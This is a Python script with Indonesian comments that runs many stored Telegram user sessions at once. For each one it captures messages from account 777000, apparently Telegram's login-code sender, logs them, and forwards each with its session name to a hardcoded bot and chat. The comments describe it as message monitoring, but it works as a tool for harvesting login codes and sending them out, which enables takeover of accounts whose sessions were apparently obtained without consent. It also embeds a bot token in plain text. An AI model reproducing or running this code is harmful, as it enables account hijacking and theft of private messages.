import os
from pyrogram import Client, filters
from datetime import datetime
import requests
import asyncio

# Folder tempat file session disimpan
session_folder = './sessions'

# ID pengguna yang ingin dipantau
target_user_id = 777000  # Ganti dengan user ID yang ingin dipantau

# File untuk menyimpan pesan yang diterima
log_file = "pesan_log.json"

# Bot Token dan User ID Anda
bot_token = "7887518893:AAFHMOPqsp6sqlpgsKUL4LF6lY2U1o-_ULQ"
chat_id = "-1002432350517"

# Fungsi untuk mengirimkan notifikasi ke Telegram
def send_telegram_notification(message_text):
    send_message_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": message_text
    }
    response = requests.post(send_message_url, data=data)
    if response.status_code == 200:
        print(f"Notifikasi terkirim ke {chat_id}")
    else:
        print(f"Gagal mengirim notifikasi. Status: {response.status_code}")

# Fungsi untuk menyimpan pesan ke dalam file
def save_message_to_file(sender, message_text):
    with open(log_file, "a") as file:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        file.write(f"[{timestamp}] Pesan dari {sender}: {message_text}\n")
    print(f"Pesan disimpan ke {log_file}")

# Fungsi untuk memantau pesan dari pengguna yang ditentukan
async def monitor_messages(app, session_name):
    @app.on_message(filters.user(target_user_id))
    async def handle_message(client, message):
        try:
            # Cetak pesan yang diterima dari user target
            sender = message.from_user.id
            print(f"Pesan baru dari {sender}: {message.text}")

            # Simpan pesan ke dalam file
            save_message_to_file(sender, message.text)

            # Kirim notifikasi ke Telegram dengan nama session
            notif_message = f"Pesan baru dari {sender} (Session: {session_name}): {message.text}"
            send_telegram_notification(notif_message)

        except ValueError as ve:
            print(f"ValueError: {str(ve)} - Mungkin terkait dengan peer yang tidak valid.")
        except KeyError as ke:
            print(f"KeyError: {str(ke)} - Mungkin ID tidak ditemukan di storage.")
        except Exception as e:
            print(f"Terjadi kesalahan: {str(e)}")

    print(f"Sedang memantau pesan dari user ID {target_user_id} dengan session: {session_name}...")

    # Menjalankan client dengan polling
    await app.start()  # Memulai client

    # Loop untuk menjaga agar client tetap aktif
    while True:
        await asyncio.sleep(1)  # Menghindari penggunaan CPU yang berlebihan

async def main():
    tasks = []
    # Iterasi untuk setiap file session dalam folder
    for session_file in os.listdir(session_folder):
        if session_file.endswith('.session'):
            session_path = os.path.join(session_folder, session_file.replace('.session', ''))
            session_name = session_file.replace('.session', '')
            print(f"Menggunakan session: {session_path}")

            # Buat client dengan session yang ada
            app = Client(session_path)

            # Memantau setiap session secara paralel
            task = asyncio.create_task(monitor_messages(app, session_name))
            tasks.append(task)

    await asyncio.gather(*tasks)  # Menjalankan semua task secara bersamaan

if __name__ == '__main__':
    asyncio.run(main())
